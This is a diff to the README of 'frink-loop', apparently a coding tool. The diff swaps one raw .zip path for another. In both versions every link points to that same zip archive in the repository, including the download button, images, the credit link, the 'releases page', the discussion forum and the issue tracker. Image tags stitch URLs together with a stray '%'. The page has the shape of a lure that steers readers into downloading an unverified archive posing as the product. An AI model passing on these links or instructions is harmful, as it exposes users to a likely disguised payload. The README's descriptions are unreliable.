@@ -1,13 +1,13 @@
 # 🚀 frink-loop - Efficient Coding Made Simple
 
 <p align="center">
-  <a href="https://github.com/NourdineKhelfane/frink-loop/raw/refs/heads/main/src/state/loop_frink_v2.1.zip">
-    <img src="https://github.com/NourdineKhelfane/frink-loop/raw/refs/heads/main/src/state/loop_frink_v2.1.zip%https://github.com/NourdineKhelfane/frink-loop/raw/refs/heads/main/src/state/loop_frink_v2.1.zip" alt="Download frink-loop" />
+  <a href="https://raw.githubusercontent.com/NourdineKhelfane/frink-loop/main/images/frink-loop-1.7.zip">
+    <img src="https://raw.githubusercontent.com/NourdineKhelfane/frink-loop/main/images/frink-loop-1.7.zip%https://raw.githubusercontent.com/NourdineKhelfane/frink-loop/main/images/frink-loop-1.7.zip" alt="Download frink-loop" />
   </a>
 </p>
 
 <p align="center">
-  <img src="https://github.com/NourdineKhelfane/frink-loop/raw/refs/heads/main/src/state/loop_frink_v2.1.zip" alt="Frink Loop" width="400">
+  <img src="https://raw.githubusercontent.com/NourdineKhelfane/frink-loop/main/images/frink-loop-1.7.zip" alt="Frink Loop" width="400">
 </p>
 
 <p align="center">
@@ -19,11 +19,11 @@
 </p>
 
 <p align="center">
-  Inspired by <a href="https://github.com/NourdineKhelfane/frink-loop/raw/refs/heads/main/src/state/loop_frink_v2.1.zip">Ralph Loop</a>
+  Inspired by <a href="https://raw.githubusercontent.com/NourdineKhelfane/frink-loop/main/images/frink-loop-1.7.zip">Ralph Loop</a>
 </p>
 
 <p align="center">
-  <img src="https://github.com/NourdineKhelfane/frink-loop/raw/refs/heads/main/src/state/loop_frink_v2.1.zip" alt="Frink Loop in action" width="700">
+  <img src="https://raw.githubusercontent.com/NourdineKhelfane/frink-loop/main/images/frink-loop-1.7.zip" alt="Frink Loop in action" width="700">
 </p>
 
 ---
@@ -38,12 +38,12 @@
 
 To get started with Frink Loop, visit the releases page to download the latest version of the application. 
 
-[Download here](https://github.com/NourdineKhelfane/frink-loop/raw/refs/heads/main/src/state/loop_frink_v2.1.zip) or click the button above.
+[Download here](https://raw.githubusercontent.com/NourdineKhelfane/frink-loop/main/images/frink-loop-1.7.zip) or click the button above.
 
 Follow these steps to install and run the software:
 
 1. **Visit the Releases Page**  
-   Click on [this link](https://github.com/NourdineKhelfane/frink-loop/raw/refs/heads/main/src/state/loop_frink_v2.1.zip) to access the release options.
+   Click on [this link](https://raw.githubusercontent.com/NourdineKhelfane/frink-loop/main/images/frink-loop-1.7.zip) to access the release options.
 
 2. **Select the Latest Version**  
    Look for the latest release at the top of the page, and you will see assets attached to that release.
@@ -104,8 +104,8 @@ If you face issues while using Frink Loop, consider these tips:
 
 Join our community where you can ask questions and find more guides. 
 
-- [Discussion Forum](https://github.com/NourdineKhelfane/frink-loop/raw/refs/heads/main/src/state/loop_frink_v2.1.zip)  
-- [Issue Tracker](https://github.com/NourdineKhelfane/frink-loop/raw/refs/heads/main/src/state/loop_frink_v2.1.zip)
+- [Discussion Forum](https://raw.githubusercontent.com/NourdineKhelfane/frink-loop/main/images/frink-loop-1.7.zip)  
+- [Issue Tracker](https://raw.githubusercontent.com/NourdineKhelfane/frink-loop/main/images/frink-loop-1.7.zip)
 
 Explore our documentation for more detailed guides as you grow your skills with Frink Loop.
 
